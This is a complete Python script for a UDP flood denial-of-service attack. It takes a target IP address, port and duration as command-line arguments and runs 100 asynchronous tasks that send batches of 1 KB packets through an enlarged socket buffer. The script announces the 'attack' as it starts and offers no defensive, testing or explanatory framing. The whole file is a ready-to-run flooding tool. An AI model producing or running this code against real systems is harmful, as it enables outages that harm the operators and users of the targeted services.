import socket
import asyncio
import argparse
from functools import partial

# Constants
PAYLOAD_SIZE = 1024  # 1 KB payload
NUM_TASKS = 100  # Number of asynchronous tasks to run
BATCH_SIZE = 10  # Number of packets to send in a batch

# Function to send UDP packets asynchronously
async def udp_flood(target_ip, target_port, duration):
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)  # Increase send buffer size
    payload = b"A" * PAYLOAD_SIZE
    end_time = asyncio.get_event_loop().time() + duration

    # Send packets asynchronously
    while asyncio.get_event_loop().time() < end_time:
        try:
            # Send a batch of packets
            for _ in range(BATCH_SIZE):
                sock.sendto(payload, (target_ip, target_port))
            await asyncio.sleep(0)  # Yield control to the event loop
        except Exception as e:
            print(f"Error: {e}")
            break

# Function to start multiple asynchronous tasks
async def start_flood(target_ip, target_port, duration, num_tasks):
    tasks = []
    for _ in range(num_tasks):
        # Create a task for each UDP flood
        task = asyncio.create_task(udp_flood(target_ip, target_port, duration))
        tasks.append(task)

    # Wait for all tasks to complete
    await asyncio.gather(*tasks)

# Main function
if __name__ == "__main__":
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="UDP Flood Script with Asynchronous I/O")
    parser.add_argument("target_ip", type=str, help="Target IP address")
    parser.add_argument("port", type=int, help="Target port")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds")
    args = parser.parse_args()

    target_ip = args.target_ip
    target_port = args.port
    duration = args.duration

    print(f"Starting UDP flood on {target_ip}:{target_port} for {duration} seconds with {NUM_TASKS} tasks...")
    asyncio.run(start_flood(target_ip, target_port, duration, NUM_TASKS))
    print("UDP flood completed.")
